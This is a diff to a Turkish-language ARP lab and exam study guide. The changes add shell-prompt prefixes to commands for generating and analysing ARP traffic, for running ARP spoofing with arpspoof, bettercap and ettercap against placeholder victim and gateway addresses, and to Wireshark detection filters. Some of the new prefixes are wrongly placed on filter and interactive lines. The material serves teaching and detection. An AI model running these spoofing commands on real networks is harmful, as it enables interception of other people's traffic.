@@ -58,7 +58,7 @@ CİHAZ A (172.50.2.100)                    CİHAZ B (172.50.2.10)
 
 ```sh
 # ARP trafiği üret:
-./scripts/generate-traffic.sh arp
+$ ./scripts/generate-traffic.sh arp
 
 # Wireshark ile aç:
 # macOS: open -a Wireshark module-03-arp.pcap
@@ -166,7 +166,7 @@ arp.opcode == 1 && arp.src.proto_ipv4 == 172.50.2.200
 
 **tshark teyidi:**
 ```sh
-tshark -r shared/pcaps/module-03-arp.pcap -Y \
+$ tshark -r shared/pcaps/module-03-arp.pcap -Y \
   'arp.opcode == 1 && arp.src.proto_ipv4 == 172.50.2.200' \
   -T fields -e arp.dst.proto_ipv4 | sort -u | wc -l
 ```
@@ -213,23 +213,23 @@ Wireshark otomatik olarak `arp.duplicate-address-detected` analiziyle bu durumu 
 
 ```sh
 # 1. arpspoof (dsniff paketi):
-sudo apt-get install dsniff
-sudo arpspoof -i eth0 -t <kurban_IP> <gateway_IP>
+$ sudo apt-get install dsniff
+$ sudo arpspoof -i eth0 -t <kurban_IP> <gateway_IP>
 
 # 2. bettercap (modern araç):
-sudo apt-get install bettercap
-sudo bettercap -iface eth0
-> net.probe on
-> set arp.spoof.targets <kurban_IP>
-> arp.spoof on
+$ sudo apt-get install bettercap
+$ sudo bettercap -iface eth0
+$ > net.probe on
+$ > set arp.spoof.targets <kurban_IP>
+$ > arp.spoof on
 
 # 3. ettercap (GUI + CLI):
 # Not: ettercap'ta /IP// biçimi: port boş bırakılır.
-sudo ettercap -T -i eth0 -M arp /<gateway_IP>// /<kurban_IP>//
+$ sudo ettercap -T -i eth0 -M arp /<gateway_IP>// /<kurban_IP>//
 
 # Wireshark tespit filtreleri:
-arp.src.proto_ipv4 == "<gateway_IP>"
-arp.duplicate-address-detected
+$ arp.src.proto_ipv4 == "<gateway_IP>"
+$ arp.duplicate-address-detected
 ```
 
 **Sınavda bilmen gerekenler:**
